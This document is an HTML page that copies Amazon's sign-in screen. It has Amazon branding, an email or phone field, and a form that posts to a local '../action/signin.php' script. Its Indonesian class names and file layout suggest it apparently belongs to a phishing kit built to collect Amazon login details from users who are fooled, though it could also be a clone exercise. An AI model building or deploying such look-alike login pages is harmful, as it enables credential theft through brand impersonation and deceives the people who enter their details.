<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon — Sign In</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
        body { background: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
        
        .logo { margin: 10px 0 20px; text-align: center; }
        .logo img { height: 31px; }
        
        .kotak { width: 100%; max-width: 348px; border: 1px solid #ddd; border-radius: 4px; padding: 20px 26px; }
        h1 { font-size: 28px; font-weight: 400; margin-bottom: 10px; }
        
        label { font-size: 13px; font-weight: 700; display: block; margin: 18px 0 6px; }
        input { width: 100%; padding: 7px 8px; border: 1px solid #a6a6a6; border-radius: 3px; font-size: 15px; }
        input:focus { outline: none; border-color: #007185; box-shadow: 0 0 3px rgba(0,113,133,.5); }
        
        .tombol { width: 100%; padding: 10px; margin: 22px 0; background: #FFD814; border: 1px solid #FCD200; border-radius: 8px; font-size: 15px; cursor: pointer; }
        .tombol:hover { background: #F7CA00; }
        
        .salah { color: #d00; font-size: 13px; margin-bottom: 12px; display: none; }
        .salah-icon { display: inline-block; width: 20px; height: 20px; background: #d00; color: #fff; border-radius: 50%; text-align: center; line-height: 20px; margin-right: 8px; font-weight: bold; }
        
        .ketentuan { font-size: 12px; line-height: 1.5; margin-top: 10px; }
        .ketentuan a { color: #0066c0; text-decoration: none; }
        .ketentuan a:hover { text-decoration: underline; }
        
        .garis-pemisah { display: flex; align-items: center; margin: 30px 0; }
        .garis { flex: 1; height: 1px; background: #e7e7e7; }
        .teks-baru { padding: 0 10px; font-size: 12px; color: #767676; }
        
        .tombol-buat { width: 348px; padding: 10px; background: #fff; border: 1px solid #d5d9d9; border-radius: 8px; font-size: 14px; cursor: pointer; margin-bottom: 40px; }
        .tombol-buat:hover { background: #f7fafa; }
        
        .bawah { font-size: 11px; color: #555; text-align: center; margin-top: auto; padding: 20px 0; }
        .bawah a { color: #0066c0; text-decoration: none; margin: 0 8px; }
        .bawah a:hover { text-decoration: underline; }
        .copyright { margin-top: 5px; }
    </style>
</head>
<body>

<div class="logo">
    <a href="amazon.html">
        <img src="../assets/img/amazonlogo.png" alt="Amazon">
    </a>
</div>

<div class="kotak">
    <h1>Sign In</h1>

    <div class="salah" id="pesanSalah">
        <span class="salah-icon">!</span>Enter your email or mobile phone number
    </div>

    <form action="../action/signin.php" method="POST" id="formEmail">
        <label for="email">Email or mobile phone number</label>
        <input type="text" id="email" name="email" required>

        <button type="submit" class="tombol">Continue</button>
    </form>

    <p class="ketentuan">By continuing, you agree to Amazon's 
        <a href="#">Conditions of Use</a> and 
        <a href="#">Privacy Notice</a>.
    </p>
</div>

<div class="garis-pemisah">
    <div class="garis"></div>
    <span class="teks-baru">New to Amazon?</span>
    <div class="garis"></div>
</div>

<button class="tombol-buat">Create your Amazon account</button>

<div class="bawah">
    <a href="#">Conditions of Use</a>
    <a href="#">Privacy Notice</a>
    <a href="#">Help</a>
    <div class="copyright">© 1996-2026, Amazon.com, Inc. or its affiliates</div>
</div>

<script>
if (location.search.includes('error=email')) {
    document.getElementById('pesanSalah').style.display = 'block';
    document.getElementById('email').style.borderColor = '#d00';
}
</script>

</body>
</html>
